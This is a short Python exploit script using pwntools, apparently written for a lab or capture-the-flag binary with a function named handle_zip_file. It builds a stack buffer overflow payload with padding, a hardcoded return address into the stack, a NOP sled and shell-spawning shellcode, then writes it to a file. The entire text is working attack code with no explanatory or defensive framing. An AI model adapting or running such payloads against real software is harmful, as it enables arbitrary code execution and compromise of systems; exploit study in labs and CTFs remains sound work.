#Replace address at ret with the adress of epb of function handle_zip_file
#This script will write payload to temp file payload in raw bytes

from pwn import *

padding = b'A'*76
ret = p32(0xffffd078+120)
nop = b'\x90'*240
shellcode = asm(shellcraft.sh())

payload = padding+ret+nop+shellcode

with open('payload','wb') as f:
	f.write(payload)
